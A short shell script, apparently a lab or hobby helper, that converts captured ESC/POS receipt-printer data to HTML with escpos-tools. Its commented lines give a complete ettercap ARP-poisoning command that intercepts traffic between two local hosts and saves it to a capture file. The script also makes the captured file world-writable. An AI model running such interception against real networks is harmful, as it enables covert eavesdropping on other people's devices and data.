# etterfilter ver4.filter -o ver4.ef
# chmod +x ./file.sh
# sudo ettercap -T -M arp -i wlp59s0 /192.168.1.102// /192.168.1.104// -w allcap.cap -F ver4.ef
echo "shell is running"

sudo chmod 777 original

# here is /Documents/rekeep/sniff

mv original ../nitith/escpos-tools/ip

php ../nitith/escpos-tools/esc2html.php ../nitith/escpos-tools/ip/original > ../nitith/escpos-tools/op/original.html
